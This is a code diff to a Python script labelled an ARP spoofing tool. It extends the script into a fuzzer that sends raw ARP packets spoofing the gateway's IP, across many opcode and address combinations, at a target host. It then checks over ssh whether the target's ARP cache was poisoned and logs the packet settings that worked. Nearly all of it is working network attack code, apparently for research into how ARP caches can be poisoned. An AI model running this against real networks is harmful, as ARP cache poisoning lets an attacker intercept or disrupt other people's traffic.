@@ -19,7 +19,8 @@ from socket import socket, AF_PACKET, SOCK_RAW
 from struct import pack
 from socket import inet_aton
 from time import sleep
-from typing import Union, List
+from typing import Union, List, Dict
+from json import dumps
 # endregion
 
 # region Authorship information
@@ -34,21 +35,39 @@ __status__ = 'Development'
 # endregion
 
 
+# region Convert MAC address to MacOS format
+def macos_convert_mac(mac_address: str) -> str:
+    if base.mac_address_validation(mac_address):
+        address_in_macos_arp_table: str = ''
+        for part_of_address in mac_address.split(':'):
+            if part_of_address[0] == '0':
+                address_in_macos_arp_table += part_of_address[1] + ':'
+            else:
+                address_in_macos_arp_table += part_of_address + ':'
+        return address_in_macos_arp_table[:-1]
+    else:
+        return mac_address
+# endregion
+
+
 # region Get mac of IPv4 gateway over ssh
 def get_ipv4_gateway_mac_over_ssh(target_ipv4_address: str = '192.168.0.5',
                                   target_user_name: str = 'user',
                                   gateway_ipv4_address: str = '192.168.0.254') -> str:
-    gateway_mac_address: str = ''
+    gateway_mac_address: str = 'No route to host'
     target_command = run(['ssh ' + target_user_name + '@' + target_ipv4_address +
-                          ' "arp -an | grep ' + gateway_ipv4_address + '"'],
+                          ' "arp ' + gateway_ipv4_address + '"'],
                          shell=True, stdout=PIPE, stderr=STDOUT)
     target_arp_table: bytes = target_command.stdout
     target_arp_table: str = target_arp_table.decode('utf-8')
-    target_arp_table: List[str] = target_arp_table.split(' ')
-    try:
-        return target_arp_table[3]
-    except IndexError:
+    if 'No route to host' in target_arp_table:
         return gateway_mac_address
+    else:
+        target_arp_table: List[str] = target_arp_table.split(' ')
+        try:
+            return target_arp_table[3]
+        except IndexError:
+            return gateway_mac_address
 # endregion
 
 
@@ -58,17 +77,19 @@ def update_arp_table_over_ssh(target_ipv4_address: str = '192.168.0.5',
                               gateway_ipv4_address: str = '192.168.0.254',
                               real_gateway_mac_address: str = '12:34:56:78:90:ab') -> bool:
     run(['ssh ' + target_user_name + '@' + target_ipv4_address +
-         ' "arp -d ' + gateway_ipv4_address + ' > /dev/null 2>&1"'], shell=True)
-    run(['ssh ' + target_user_name + '@' + target_ipv4_address +
-         ' "ping -c 1 ' + gateway_ipv4_address + ' > /dev/null 2>&1"'], shell=True)
+         ' "arp -d ' + gateway_ipv4_address + ' > /dev/null 2>&1; ping -c 1 ' +
+         gateway_ipv4_address + ' > /dev/null 2>&1"'], shell=True)
     target_command = run(['ssh ' + target_user_name + '@' + target_ipv4_address +
-                          ' "arp -an | grep ' + gateway_ipv4_address + '"'],
+                          ' "arp ' + gateway_ipv4_address + '"'],
                          shell=True, stdout=PIPE, stderr=STDOUT)
     target_arp_table: bytes = target_command.stdout
     target_arp_table: str = target_arp_table.decode('utf-8')
+    if 'No route to host' in target_arp_table:
+        base.print_error('Target: ', target_ipv4_address, ' is disconnected!')
+        sleep(5)
+        update_arp_table_over_ssh(target_ipv4_address, target_user_name, gateway_ipv4_address, real_gateway_mac_address)
     target_arp_table: List[str] = target_arp_table.split(' ')
-    # base.print_info('Current gateway MAC address: ', target_arp_table[3])
-    if target_arp_table[3] == real_gateway_mac_address:
+    if target_arp_table[3] == macos_convert_mac(real_gateway_mac_address):
         return True
     else:
         return False
@@ -80,23 +101,37 @@ def check_ipv4_gateway_mac(target_ipv4_address: str = '192.168.0.5',
                            target_user_name: str = 'user',
                            gateway_ipv4_address: str = '192.168.0.254',
                            real_gateway_mac_address: str = '12:34:56:78:90:ab',
-                           test_parameter_name: str = 'test',
-                           test_parameter_value: Union[None, int, bytes, str] = None) -> None:
+                           test_parameters: Union[None, Dict[str, Union[int, str]]] = None,
+                           test_parameters_index: int = 0) -> None:
     current_gateway_mac_address: str = get_ipv4_gateway_mac_over_ssh(target_ipv4_address,
                                                                      target_user_name,
                                                                      gateway_ipv4_address)
-    if current_gateway_mac_address == real_gateway_mac_address:
-        if test_parameter_value is None:
-            base.print_info('IPv4 gateway MAC address not changed: ', real_gateway_mac_address)
-        else:
-            base.print_info('IPv4 gateway MAC address not changed: ', current_gateway_mac_address,
-                            ' tested parameter: ', test_parameter_name + ' - ' + str(test_parameter_value))
+
+    if current_gateway_mac_address == 'No route to host' or current_gateway_mac_address == 'host':
+        if test_parameters is not None:
+            base.print_warning('index: ', str(test_parameters_index), ' gateway: ', current_gateway_mac_address,
+                               ' parameters: ', dumps(test_parameters))
+            with open('arp_fuzz_disconnect.txt', 'a') as result_file:
+                result_file.write('index: ' + str(test_parameters_index) +
+                                  ' gateway: ' + current_gateway_mac_address +
+                                  ' parameters: ' + dumps(test_parameters) + '\n')
+        sleep(5)
+        check_ipv4_gateway_mac(target_ipv4_address, target_user_name, gateway_ipv4_address, real_gateway_mac_address,
+                               test_parameters, test_parameters_index)
+
+    if current_gateway_mac_address == macos_convert_mac(real_gateway_mac_address):
+        if test_parameters is not None:
+            base.print_info('index: ', str(test_parameters_index), ' gateway: ', current_gateway_mac_address,
+                            ' parameters: ', dumps(test_parameters))
+
     else:
-        if test_parameter_value is None:
-            base.print_success('IPv4 gateway MAC address is changed: ', current_gateway_mac_address)
-        else:
-            base.print_success('IPv4 gateway MAC address is changed: ', current_gateway_mac_address,
-                               ' tested parameter: ', test_parameter_name + ' - ' + str(test_parameter_value))
+        if test_parameters is not None:
+            base.print_success('index: ', str(test_parameters_index), ' gateway: ', current_gateway_mac_address,
+                               ' parameters: ', dumps(test_parameters))
+            with open('arp_fuzz_success.txt', 'a') as result_file:
+                result_file.write('index: ' + str(test_parameters_index) +
+                                  ' gateway: ' + current_gateway_mac_address +
+                                  ' parameters: ' + dumps(test_parameters) + '\n')
         while True:
             if update_arp_table_over_ssh(target_ipv4_address=target_ipv4_address,
                                          target_user_name='root',
@@ -138,11 +173,11 @@ if __name__ == '__main__':
         # region Parse script arguments
         parser: ArgumentParser = ArgumentParser(description='ARP spoofing script')
         parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
-        parser.add_argument('-T', '--target_ip', help='Set target IP address', default=None)
-        parser.add_argument('-t', '--target_mac', help='Set target MAC address', default=None)
+        parser.add_argument('-T', '--target_ip', help='Set target IP address', required=True)
+        parser.add_argument('-t', '--target_mac', help='Set target MAC address', required=True)
         parser.add_argument('-u', '--target_user', help='Set target user name for ssh', default='user')
-        parser.add_argument('-G', '--gateway_ip', help='Set gateway IP address', default=None)
-        parser.add_argument('-g', '--gateway_mac', help='Set gateway IP address', default=None)
+        parser.add_argument('-G', '--gateway_ip', help='Set gateway IP address', required=True)
+        parser.add_argument('-g', '--gateway_mac', help='Set gateway IP address', required=True)
         args = parser.parse_args()
         # endregion
 
@@ -160,52 +195,254 @@ if __name__ == '__main__':
         raw_socket.bind((current_network_interface, 0))
         # endregion
 
+        test = get_ipv4_gateway_mac_over_ssh(args.target_ip, 'vladimir', args.gateway_ip)
+
         # region Variables
-        network_type: int = 0x0806
-        hardware_type: int = 0x0001
-        protocol_type: int = 0x0800
-        hardware_size: int = 0x06
-        protocol_size: int = 0x04
-        response_opcode: int = 0x0002
-        request_opcode: int = 0x0001
+        number_of_arp_packets: int = 5
+        interval_between_sending_arp_packets: float = 0.1
+
+        default_network_type: int = 0x0806   # ARP protocol
+        default_hardware_type: int = 0x0001  # Ethernet
+        default_protocol_type: int = 0x0800  # IPv4
+        default_hardware_size: int = 0x06    # Length of MAC address
+        default_protocol_size: int = 0x04    # Length of IP address
+        default_opcode: int = 0x0002         # ARP response
+
+        # Long list
+        # test_hardware_types: List[int] = [
+        #     0,  # reserved.	RFC 5494
+        #     1,  # Ethernet.
+        #     2,  # Experimental Ethernet.
+        #     3,  # Amateur Radio AX.25.
+        #     4,  # Proteon ProNET Token Ring.
+        #     5,  # Chaos.
+        #     6,  # IEEE 802.
+        #     7,  # ARCNET.	RFC 1201
+        #     8,  # Hyperchannel.
+        #     9,  # Lanstar.
+        #     10,  # Autonet Short Address.
+        #     11,  # LocalTalk.
+        #     12,  # LocalNet (IBM PCNet or SYTEK LocalNET).
+        #     13,  # Ultra link.
+        #     14,  # SMDS.
+        #     15,  # Frame Relay.
+        #     16,  # ATM, Asynchronous Transmission Mode.
+        #     17,  # HDLC.
+        #     18,  # Fibre Channel.	RFC 4338
+        #     19,  # ATM, Asynchronous Transmission Mode.	RFC 2225
+        #     20,  # Serial Line.
+        #     21,  # ATM, Asynchronous Transmission Mode.
+        #     22,  # MIL-STD-188-220.
+        #     23,  # Metricom.
+        #     24,  # IEEE 1394.1995.
+        #     25,  # MAPOS.
+        #     26,  # Twinaxial.
+        #     27,  # EUI-64.
+        #     28,  # HIPARP.	RFC 2834, RFC 2835
+        #     29,  # IP and ARP over ISO 7816-3.
+        #     30,  # ARPSec.
+        #     31,  # IPsec tunnel.	RFC 3456
+        #     32,  # Infiniband.	RFC 4391
+        #     33,  # CAI, TIA-102 Project 25 Common Air Interface.
+        #     34,  # Wiegand Interface.
+        #     35,  # Pure IP.
+        #     36,  # HW_EXP1	RFC 5494
+        #     256  # HW_EXP2
+        # ]
+
+        # Short list
+        test_hardware_types: List[int] = [
+            0,  # reserved.	RFC 5494
+            1,  # Ethernet.
+        ]
+
+        test_protocol_types: List[int] = [
+            0x0800  # IPv4
+        ]
+
+        test_hardware_sizes: List[int] = [
+            0x06  # Length of MAC address
+        ]
+
+        test_protocol_sizes: List[int] = [
+            0x04  # Length of IP address
+        ]
+
+        # Long list
+        test_opcodes: List[int] = [
+            0,  # reserved.	RFC 5494
+            1,  # Request.	RFC 826, RFC 5227
+            2,  # Reply.	RFC 826, RFC 1868, RFC 5227
+            3,  # Request Reverse.	RFC 903
+            4,  # Reply Reverse.	RFC 903
+            5,  # DRARP Request.	RFC 1931
+            6,  # DRARP Reply.	RFC 1931
+            7,  # DRARP Error.	RFC 1931
+            8,  # InARP Request.	RFC 1293
+            9,  # InARP Reply.	RFC 1293
+            10,  # ARP NAK.	RFC 1577
+            11,  # MARS Request.
+            12,  # MARS Multi.
+            13,  # MARS MServ.
+            14,  # MARS Join.
+            15,  # MARS Leave.
+            16,  # MARS NAK.
+            17,  # MARS Unserv.
+            18,  # MARS SJoin.
+            19,  # MARS SLeave.
+            20,  # MARS Grouplist Request.
+            21,  # MARS Grouplist Reply.
+            22,  # MARS Redirect Map.
+            23,  # MAPOS UNARP.	RFC 2176
+            24,  # OP_EXP1.	RFC 5494
+            25  # OP_EXP2.	RFC 5494
+        ]
+
+        # Short list
+        # test_opcodes: List[int] = [
+        #     0,  # reserved.	RFC 5494
+        #     1,  # Request.	RFC 826, RFC 5227
+        #     2,  # Reply.	RFC 826, RFC 1868, RFC 5227
+        #     5,  # DRARP Request.	RFC 1931
+        #     6,  # DRARP Reply.	RFC 1931
+        #     7,  # DRARP Error.	RFC 1931
+        #     8,  # InARP Request.	RFC 1293
+        #     9,  # InARP Reply.	RFC 1293
+        #     10,  # ARP NAK.	RFC 1577
+        #     11,  # MARS Request.
+        #     12,  # MARS Multi.
+        #     13,  # MARS MServ.
+        #     14,  # MARS Join.
+        #     15,  # MARS Leave.
+        #     16,  # MARS NAK.
+        #     17,  # MARS Unserv.
+        #     18,  # MARS SJoin.
+        #     19,  # MARS SLeave.
+        #     20,  # MARS Grouplist Request.
+        #     21,  # MARS Grouplist Reply.
+        #     22,  # MARS Redirect Map.
+        #     23  # MAPOS UNARP.	RFC 2176
+        # ]
+
+        # Long list
+        # sender_mac_addresses: List[str] = [
+        #     your_mac_address,  # Your MAC address
+        #     args.gateway_mac,  # Gateway MAC address
+        #     args.target_mac  # Target MAC address
+        # ]
+        # sender_ip_addresses: List[str] = [
+        #     your_ip_address,  # Your IP address
+        #     args.gateway_ip,  # Gateway IP address
+        #     args.target_ip  # Target IP address
+        # ]
+        # target_mac_addresses: List[str] = [
+        #     your_mac_address,  # Your MAC address
+        #     args.gateway_mac,  # Gateway MAC address
+        #     args.target_mac  # Target MAC address
+        # ]
+        # target_ip_addresses: List[str] = [
+        #     your_ip_address,  # Your IP address
+        #     args.gateway_ip,  # Gateway IP address
+        #     args.target_ip  # Target IP address
+        # ]
+
+        # Short list
+        sender_mac_addresses: List[str] = [
+            your_mac_address,  # Your MAC address
+            '00:00:00:00:00:00',  # Empty MAC address
+        ]
+        sender_ip_addresses: List[str] = [
+            your_ip_address,  # Your IP address
+            args.gateway_ip,  # Gateway IP address
+        ]
+        target_mac_addresses: List[str] = [
+            your_mac_address,  # Your MAC address
+            '00:00:00:00:00:00',  # Empty MAC address
+        ]
+        target_ip_addresses: List[str] = [
+            your_ip_address,  # Your IP address
+            args.gateway_ip,  # Gateway IP address
+        ]
+
+        destination_mac_addresses: List[str] = [
+            args.target_mac,  # Target MAC address
+            'ff:ff:ff:ff:ff:ff',  # Broadcast MAC address
+            '33:33:00:00:00:01'  # IPv6 multicast MAC address
+        ]
+        source_mac_addresses: List[str] = [
+            your_mac_address  # Your MAC address
+        ]
+        network_types: List[int] = [
+            0x0806  # ARP protocol
+        ]
+
+        tested_parameters: List[Dict[str, Dict[str, Union[int, str]]]] = list()
+        for test_hardware_type in test_hardware_types:
+            for test_protocol_type in test_protocol_types:
+                for test_hardware_size in test_hardware_sizes:
+                    for test_protocol_size in test_protocol_sizes:
+                        for test_opcode in test_opcodes:
+                            for sender_mac_address in sender_mac_addresses:
+                                for sender_ip_address in sender_ip_addresses:
+                                    for target_mac_address in target_mac_addresses:
+                                        for target_ip_address in target_ip_addresses:
+                                            for destination_mac_address in destination_mac_addresses:
+                                                for source_mac_address in source_mac_addresses:
+                                                    for network_type in network_types:
+                                                        tested_parameters.append({
+                                                            'ARP': {
+                                                                'hardware_type': test_hardware_type,
+                                                                'protocol_type': test_protocol_type,
+                                                                'hardware_size': test_hardware_size,
+                                                                'protocol_size': test_protocol_size,
+                                                                'opcode': test_opcode,
+                                                                'sender_mac_address': sender_mac_address,
+                                                                'sender_ip_address': sender_ip_address,
+                                                                'target_mac_address': target_mac_address,
+                                                                'target_ip_address': target_ip_address,
+                                                            },
+                                                            'Ethernet': {
+                                                                'destination_mac_address': destination_mac_address,
+                                                                'source_mac_address': source_mac_address,
+                                                                'network_type': network_type
+                                                            }
+                                                        })
         # endregion
 
         # region Check ARP
-        for test_opcode in range(0, 255, 1):
+        for index in range(1250, len(tested_parameters)):
 
-            arp_packet: bytes = b''
-            sender_ip: bytes = inet_aton(args.gateway_ip)
-            target_ip: bytes = inet_aton(base.get_random_ip_on_interface(current_network_interface))
-            sender_mac: bytes = eth.convert_mac(mac_address=your_mac_address)
-            target_mac: bytes = eth.convert_mac(mac_address=eth.make_random_mac())
-            arp_packet += pack('!H', hardware_type)
-            arp_packet += pack('!H', protocol_type)
-            arp_packet += pack('!B', hardware_size)
-            arp_packet += pack('!B', protocol_size)
-            arp_packet += pack('!H', test_opcode)
+            sender_mac: bytes = eth.convert_mac(mac_address=tested_parameters[index]['ARP']['sender_mac_address'])
+            sender_ip: bytes = inet_aton(tested_parameters[index]['ARP']['sender_ip_address'])
+            target_mac: bytes = eth.convert_mac(mac_address=tested_parameters[index]['ARP']['target_mac_address'])
+            target_ip: bytes = inet_aton(tested_parameters[index]['ARP']['target_ip_address'])
+
+            arp_packet: bytes = pack('!H', tested_parameters[index]['ARP']['hardware_type'])
+            arp_packet += pack('!H', tested_parameters[index]['ARP']['protocol_type'])
+            arp_packet += pack('!B', tested_parameters[index]['ARP']['hardware_size'])
+            arp_packet += pack('!B', tested_parameters[index]['ARP']['protocol_size'])
+            arp_packet += pack('!H', tested_parameters[index]['ARP']['opcode'])
 
             arp_packet += sender_mac + pack('!' '4s', sender_ip)
             arp_packet += target_mac + pack('!' '4s', target_ip)
 
-            eth_header: bytes = eth.make_header(source_mac=your_mac_address,
-                                                destination_mac='ff:ff:ff:ff:ff:ff',
-                                                network_type=network_type,
-                                                exit_on_failure=True)
+            eth_header: bytes = eth.make_header(
+                source_mac=tested_parameters[index]['Ethernet']['source_mac_address'],
+                destination_mac=tested_parameters[index]['Ethernet']['destination_mac_address'],
+                network_type=tested_parameters[index]['Ethernet']['network_type'])
 
             packet: bytes = eth_header + arp_packet
-            # for _ in range(test_opcode + 1):
-            #     packet += bytes(randint(1, 255))
 
-            for _ in range(3):
+            for _ in range(number_of_arp_packets):
                 raw_socket.send(packet)
-                sleep(0.3)
+                sleep(interval_between_sending_arp_packets)
+
             check_ipv4_gateway_mac(args.target_ip,
                                    args.target_user,
                                    args.gateway_ip,
                                    args.gateway_mac,
-                                   'ARP test_opcode',
-                                   test_opcode)
-            sleep(0.5)
+                                   tested_parameters[index],
+                                   index)
         # endregion
 
     except KeyboardInterrupt:
